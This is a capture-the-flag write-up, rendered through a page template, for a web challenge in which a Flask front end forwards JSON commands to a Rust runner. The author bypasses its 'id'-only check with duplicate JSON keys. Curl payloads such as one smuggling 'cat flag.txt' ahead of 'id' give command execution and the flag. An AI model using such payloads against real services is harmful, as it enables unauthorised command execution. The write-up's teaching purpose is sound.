{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Initial thoughts", "initial-thoughts")}}

{{text("In this challange, we get a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>app.py</code> file that contains a web application in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>python</code> and a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>runner</code> file.")}}

{{text("Let's analyse the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>flask</code> application first.")}}

{{console("import json
import requests
from flask import Flask, request, abort

app = Flask(__name__)


@app.route('/run', methods=['POST'])
def run():
    payload = json.loads(request.data)
    if 'cmd' in payload:
        command = payload['cmd']
        if command != 'id':
            abort(403)
        else:
            payload = f'{{\"content\":{request.data.decode()}}}'
            print(payload)
            r = requests.post(\"http://runner/api/run\", headers={\"Content-Type\": \"application/json\"}, data=payload)
            return r.content
    else:
        abort(404)


@app.get(\"/\")
def index():
    return \"You can't connect to this API with your browser. Check the source code.\"


if __name__ == \"__main__\":
    app.run(port=5000)")}}

{{text("It seems like a simple application, if we make a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>POST</code> request to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>run</code> endpoint and we add <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>JSON</code> payload equal to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cmd: id</code>, it will return the result. If the payload cotains anything else than <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id</code> it will abort.")}}

{{text("Our request is passed to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://runner/api/run</code> endpoint, which is probably our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>runner</code> file.")}}

{{header("Reverse engineering", "reverse-engineering")}}

{{text("Let's try to reverse engineer that binary file.")}}

{{text("When I tried passing the file into <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>IDA</code>, I instantly knew it was a bad idea. The file was taking too long to load.")}}

{{text("I could have predicted that, since the file was almost <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>80MB</code>. When it finally loaded - it was even worse.")}}

{{image("../../static/writeups/yetanotherwaf/images/000001.jpg")}}

{{text("There were <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>32456</code> different functions in the file. I love rust.")}}

{{text("I had to narrow the search field. Since we know that the web application has something to do with passing JSON, and the way we get the flag is probably by sending a POST request with correct JSON, I searched for functions with JSON in them.")}}

{{image("../../static/writeups/yetanotherwaf/images/000002.jpg")}}

{{text("A lot less functions. We can notice that this file uses a lot of functions that contain the word <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>serde</code>, which is probably a library.")}}

{{text("I tried searching for more information on it.")}}

{{link("https://github.com/serde-rs/json", "./../static/writeups/images/github.jpg", "Serde JSON")}}

{{text("This is what our application uses. Unfortunately, I couldn't find any known vulnerability or exploit we could use against the application.")}}

{{header("Getting the flag", "getting-the-flag")}}

{{text("Let's go back to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>app.py</code> file.")}}

{{text("Application requires us to send <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cmd: id</code> in a POST request, but what if we send multiple <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cmd</code> keys?")}}

{{console("curl -X POST https://yaw.ecsc25.hack.cert.pl/run \\
  -H \"Content-Type: application/json\" \\
  -d '{\"cmd\": \"id\", \"cmd\": \"id\"}'", "uid=1000(appuser) gid=1000(appuser) groups=1000(appuser),100(users)")}}

{{text("It still works. Now I wonder if we can change one of the commands to trick the program into passing the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>if command != 'id':</code> check, and then executing another command.")}}

{{console("curl -X POST https://yaw.ecsc25.hack.cert.pl/run \\
  -H \"Content-Type: application/json\" \\
  -d '{\"cmd\": \"whoami\", \"cmd\": \"id\"}'", "appuser")}}

{{text("It worked! We should be able to print out the flag now.")}}

{{console("curl -X POST https://yaw.ecsc25.hack.cert.pl/run \\
  -H \"Content-Type: application/json\" \\
  -d '{\"cmd\": \"cat flag.txt\", \"cmd\": \"id\"}'", "ecsc25{names_within_an_object_SHOULD_be_unique}")}}

{{text("But why does it work? If we switch <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cat flag.txt</code> with each other, we get <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>You don&#39;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</code>")}}

{{text("This is because the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>app.py</code> file takes the last key with <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cmd</code>  and reads it's key. If it's not <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id</code>, then it fails.")}}

{{text("However, the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Serde JSON</code> library we discovered earlier takes the first <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cmd</code> key and executes it's content.")}}

{{text("So, Serdle reads <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cat flag.txt</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>app.py</code> reads <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id</code>. This is why we are getting the flag, and why every JSON key should be unique.")}}

{{script()}}